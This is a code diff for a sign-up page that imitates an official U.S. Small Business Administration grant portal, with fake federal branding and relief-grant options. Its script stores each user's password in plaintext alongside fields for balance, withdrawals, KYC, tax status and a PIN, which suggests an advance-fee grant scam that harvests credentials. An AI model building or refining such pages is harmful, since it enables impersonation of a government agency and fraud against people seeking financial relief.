@@ -10,13 +10,19 @@
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
         :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
         body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
+        
         .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
         .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
         .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
+
         .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
-        input, select { font-size: 16px !important; height: 50px; }
-        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
-        .btn-sba:disabled { opacity: 0.7; }
+        
+        input, select { font-size: 16px !important; border-radius: 4px !important; transition: all 0.2s; height: 50px; }
+        input:focus, select:focus { border-color: var(--sba-blue) !important; ring: 0 !important; outline: none !important; background: #fff !important; }
+
+        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; cursor: pointer; }
+        .btn-sba:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-sba:active:not(:disabled) { transform: scale(0.97); background: #001a3d; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
@@ -26,6 +32,15 @@
         <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official U.S. Portal • Secure Enrollment</span>
     </div>
 
+    <nav class="bg-white px-5 py-3 flex justify-between items-center border-b border-gray-100">
+        <div class="flex items-center gap-2">
+            <div class="sba-logo-box">
+                <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
+            </div>
+        </div>
+        <a href="login.html" class="text-[11px] font-black text-[#002e6d] hover:text-red-600 uppercase transition-all">Sign In</a>
+    </nav>
+
     <main class="flex-grow flex items-center justify-center p-5">
         <div class="w-full max-w-[420px]">
             <div class="auth-card p-6 md:p-10">
@@ -34,41 +49,63 @@
                     <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-2">Federal Enrollment Node V15</p>
                 </div>
 
-                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic"></div>
+                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>
 
                 <form id="registerForm" class="space-y-4">
                     <div>
                         <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Legal Full Name</label>
-                        <input type="text" id="userName" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="Enter full name">
+                        <input type="text" id="userName" required class="w-full px-4 bg-slate-50 border border-slate-200 outline-none" placeholder="Enter full name">
                     </div>
+
                     <div>
                         <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Government Email</label>
-                        <input type="email" id="userEmail" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="example@mail.com">
+                        <input type="email" id="userEmail" required class="w-full px-4 bg-slate-50 border border-slate-200 outline-none" placeholder="example@mail.com">
                     </div>
+
                     <div>
                         <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Relief Category</label>
-                        <select id="reliefType" required class="w-full px-4 bg-slate-50 border border-slate-200">
+                        <select id="reliefType" required class="w-full px-4 bg-slate-50 border border-slate-200 outline-none">
                             <option value="">Select Grant Type</option>
                             <option value="Small Business Stimulus">Small Business Stimulus</option>
                             <option value="Disaster Relief Grant">Disaster Relief Grant</option>
                             <option value="Entrepreneur Expansion">Entrepreneur Expansion</option>
                         </select>
                     </div>
+
                     <div class="grid grid-cols-2 gap-3">
                         <div>
                             <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Passkey</label>
-                            <input type="password" id="userPass" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="••••••">
+                            <input type="password" id="userPass" required class="w-full px-4 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
                         </div>
                         <div>
                             <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Confirm</label>
-                            <input type="password" id="confirmPass" required class="w-full px-4 bg-slate-50 border border-slate-200" placeholder="••••••">
+                            <input type="password" id="confirmPass" required class="w-full px-4 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••">
                         </div>
                     </div>
-                    <button type="submit" id="submitBtn" class="btn-sba w-full shadow-lg mt-4">Initialize Secure Case</button>
+
+                    <div class="flex items-start gap-3 p-4 bg-slate-50 border border-slate-100 rounded mt-2">
+                        <input type="checkbox" id="termsCheck" required class="mt-1 w-5 h-5 accent-[#002e6d] cursor-pointer">
+                        <label for="termsCheck" class="text-[10px] text-slate-500 font-bold uppercase leading-relaxed">
+                            I verify accuracy under federal law and agree to the <a href="terms.html" class="text-blue-700 underline">Privacy Disclosure</a>.
+                        </label>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn-sba w-full shadow-lg mt-4">
+                        Initialize Secure Case
+                    </button>
                 </form>
+
+                <div class="mt-8 pt-6 border-t border-slate-100 text-center">
+                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Returning Personnel?</p>
+                    <a href="login.html" class="text-[#002e6d] font-black text-[12px] uppercase tracking-[0.2em] hover:text-red-600 transition-all">Access Dashboard <i class="fas fa-chevron-right ml-1"></i></a>
+                </div>
             </div>
         </div>
     </main>
+
+    <footer class="py-6 text-center text-[10px] text-slate-400 font-bold uppercase tracking-[0.4em]">
+        <i class="fas fa-lock mr-2"></i> Encrypted Federal Node-V15
+    </footer>
 
     <script type="module">
         import { auth, db } from './firebase-config.js';
@@ -81,46 +118,62 @@
 
         regForm.onsubmit = async (e) => {
             e.preventDefault();
+            alertBox.classList.add('hidden');
+
             const name = document.getElementById('userName').value.trim();
             const email = document.getElementById('userEmail').value.toLowerCase().trim();
             const relief = document.getElementById('reliefType').value;
             const pass = document.getElementById('userPass').value;
             const confirm = document.getElementById('confirmPass').value;
 
-            if (pass !== confirm) { alertBox.innerText = "PASSKEYS DO NOT MATCH"; alertBox.classList.remove('hidden'); return; }
-            
+            if (pass.length < 6) return showAlert("SECURITY: Passkey must be 6+ characters.");
+            if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");
+
             btn.disabled = true;
-            btn.innerText = 'CONNECTING TO NODE...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> CONNECTING...';
 
             try {
                 const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                 const user = userCredential.user;
 
-                // Send email first
                 await sendEmailVerification(user);
 
-                // Create Database File
                 await setDoc(doc(db, "users", user.uid), {
                     uid: user.uid,
                     fullName: name,
                     email: email,
-                    password: pass,
+                    password: pass, 
                     reliefType: relief,
                     balance: 0,
+                    withdrawAmount: 0,
+                    withdrawStatus: "NONE",
+                    kycStatus: "PENDING",
+                    taxStatus: "PENDING",
+                    caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
+                    pin: "NOT SET",
                     isVerified: false,
                     registeredAt: new Date().toISOString()
                 });
 
-                // NO SIGNOUT HERE. Stay logged in to pass to verify.html
+                // REMOVED signOut(auth) - We need the user logged in for verify.html
                 window.location.href = "verify.html";
 
             } catch (error) {
                 btn.disabled = false;
                 btn.innerText = "Initialize Secure Case";
-                alertBox.innerText = error.message;
-                alertBox.classList.remove('hidden');
+                if (error.code === 'auth/email-already-in-use') {
+                    showAlert("SYSTEM: Email already in Federal Ledger.");
+                } else {
+                    showAlert("SYSTEM ERROR: " + error.message);
+                }
             }
         };
+
+        function showAlert(msg) {
+            alertBox.innerText = msg;
+            alertBox.classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
     </script>
 </body>
 </html>
